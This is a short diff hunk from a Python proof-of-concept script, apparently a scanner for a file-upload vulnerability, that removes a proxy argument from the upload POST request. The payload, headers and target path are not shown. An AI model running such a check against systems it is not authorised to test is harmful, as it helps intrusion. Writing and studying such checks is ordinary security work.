@@ -47,7 +47,7 @@ def poc(target):
         # 初始请求
         res = requests.get(url=target, verify=False)
         # 文件上传请求
-        res1 = requests.post(url=url, headers=headers, data=data, verify=False, proxies=proxies)
+        res1 = requests.post(url=url, headers=headers, data=data, verify=False)
 
         if res.status_code == 200:
             if res1.status_code == 200 and "result" in res1.text:
